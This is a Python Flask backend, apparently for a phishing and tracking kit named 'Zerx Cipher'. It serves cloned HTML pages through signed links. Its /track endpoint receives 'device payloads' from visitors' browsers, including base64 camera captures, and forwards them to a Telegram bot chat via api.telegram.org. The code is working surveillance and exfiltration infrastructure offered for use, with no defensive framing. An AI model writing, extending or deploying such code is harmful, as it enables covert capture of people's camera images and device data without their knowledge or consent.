#!/usr/bin/env python3
# server.py — Flask backend for Zerx Cipher
# Endpoints: /api/verify (HMAC gate), /api/clone/<slug> (clone serving), /track (device payloads), /health
# requirements: flask requests

from flask import Flask, request, jsonify, Response
import hmac, hashlib, time, sqlite3, os, json, base64
from datetime import datetime, timezone

app = Flask(__name__)

LINK_SECRET = os.environ.get("LINK_SECRET", "REPLACE_THIS_WITH_YOUR_RANDOM_SECRET")
BOT_TOKEN   = os.environ.get("BOT_TOKEN", "")
OWNER_ID    = os.environ.get("OWNER_ID", "5748713981")
DB_PATH     = os.environ.get("DB_PATH", "zerx.db")

def _sign(payload: str) -> str:
    return hmac.new(LINK_SECRET.encode(), payload.encode(), hashlib.sha256).hexdigest()[:32]

def _db():
    c = sqlite3.connect(DB_PATH, check_same_thread=False, timeout=15)
    c.row_factory = sqlite3.Row
    return c

@app.route("/api/verify", methods=["GET"])
def api_verify():
    uid_s = request.args.get("id", "")
    tok   = request.args.get("t", "")
    if not uid_s.isdigit() or not tok:
        return jsonify({"ok": False, "reason": "missing"}), 403
    uid = int(uid_s)
    try:
        exp_s, sig = tok.split(".", 1)
        exp = int(exp_s)
    except Exception:
        return jsonify({"ok": False, "reason": "malformed"}), 403
    if exp < int(time.time()):
        return jsonify({"ok": False, "reason": "expired"}), 403
    expected = _sign(f"{uid}.{exp}")
    if not hmac.compare_digest(expected, sig):
        return jsonify({"ok": False, "reason": "bad_signature"}), 403
    return jsonify({"ok": True, "uid": uid})

@app.route("/api/clone/<slug>", methods=["GET"])
def api_clone(slug):
    try:
        con = _db()
        row = con.execute("SELECT html FROM clone_html WHERE slug=?", (slug,)).fetchone()
        con.close()
    except Exception:
        return "DB error", 500
    if not row:
        return "Not found", 404
    return Response(row["html"], mimetype="text/html; charset=utf-8")

@app.route("/track", methods=["POST"])
def track():
    try:
        data = request.get_json(force=True) or {}
    except Exception:
        data = {}
    uid = str(data.get("uid", "")).strip()
    typ = data.get("type", "unknown")
    payload = data.get("data", {})
    if not uid.isdigit():
        return jsonify({"ok": False}), 400
    if not BOT_TOKEN:
        return jsonify({"ok": True}), 200
    import requests as rq
    if typ == "camera" and isinstance(payload, dict) and payload.get("image"):
        try:
            b64 = payload["image"].split(",", 1)[-1]
            rq.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                    files={"photo": ("capture.jpg", base64.b64decode(b64))},
                    data={"chat_id": uid, "caption": f"📸 Camera — {uid}"},
                    timeout=15)
        except Exception:
            pass
    else:
        try:
            text = f"📡 <b>{typ}</b>\n<code>{json.dumps(payload)[:900]}</code>"
            rq.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={"chat_id": uid, "text": text, "parse_mode": "HTML"},
                    timeout=10)
        except Exception:
            pass
    return jsonify({"ok": True}), 200

@app.route("/health", methods=["GET"])
def health():
    return jsonify({"ok": True, "ts": datetime.now(timezone.utc).isoformat()})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", "5000"))
    app.run(host="0.0.0.0", port=port)
